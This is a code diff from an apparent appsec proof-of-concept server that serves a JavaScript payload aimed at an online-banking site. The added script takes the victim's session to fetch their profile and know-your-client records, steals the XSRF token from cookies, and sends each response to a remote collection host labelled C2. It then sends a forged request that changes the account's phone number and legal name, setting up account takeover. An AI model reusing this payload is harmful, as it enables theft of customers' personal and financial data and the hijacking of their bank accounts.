@@ -52,17 +52,60 @@ app.get("/file.js", (_req, res) => {
 app.get("/olbfile.js", (_req, res) => {
   res.type("application/javascript").send(`
   var C2 = 'https://appsec-test-website.onrender.com/testpay';
-  var x = new XMLHttpRequest();
-  x.open('GET', '/sgw5/digital/chab-pda-open-service-v2/v1/client/profile-details', false);
-  x.withCredentials = true;
-  x.send();
-  
-  var profile = x.responseText;
-  
-  var e = new XMLHttpRequest();
-  e.open('POST', C2, true);
-  e.setRequestHeader('Content-Type', 'application/json');
-  e.send(profile);
+
+var x = new XMLHttpRequest();
+x.open('GET', '/sgw5/digital/chab-pda-open-service-v2/v1/client/profile-details', false);
+x.withCredentials = true;
+x.send();
+
+var profile = x.responseText;
+
+var e = new XMLHttpRequest();
+e.open('POST', C2, true);
+e.setRequestHeader('Content-Type', 'application/json');
+e.send(profile);
+
+var xsrf = document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1];
+
+var k = new XMLHttpRequest();
+k.open('GET', '/sgw5/digital/know-your-client-service/v3/kyc-service/', false);
+k.withCredentials = true;
+k.send();
+
+var kycData = JSON.parse(k.responseText);
+var ulegalName = kycData.demographics.firstName + kycData.demographics.lastName;
+
+var e2 = new XMLHttpRequest();
+e2.open('POST', C2, true);
+e2.setRequestHeader('Content-Type', 'application/json');
+e2.send(k.responseText);
+
+var p = new XMLHttpRequest();
+p.open('PUT', '/sgw5/digital/know-your-client-service/v3/kyc-service/', false);
+p.withCredentials = true;
+p.setRequestHeader('Content-Type', 'application/json');
+p.setRequestHeader('X-XSRF-TOKEN', xsrf);
+p.setRequestHeader('Kyc-Flow', 'KYC Refresh OLB');
+p.send(JSON.stringify({
+  addresses: [],
+  phone: {
+    id: kycData.phone[0].id,
+    phoneNumber: '647-9235551',
+    countryCode: '',
+    location: 'HomePhone',
+    deviceType: 'MobilePhone',
+    primary: true,
+    updated: true
+  },
+  legalName: ulegalName
+}));
+
+// Exfil PUT response (confirmation)
+var e3 = new XMLHttpRequest();
+e3.open('POST', C2, true);
+e3.setRequestHeader('Content-Type', 'application/json');
+e3.send(p.responseText);
+
   `);
 });
 
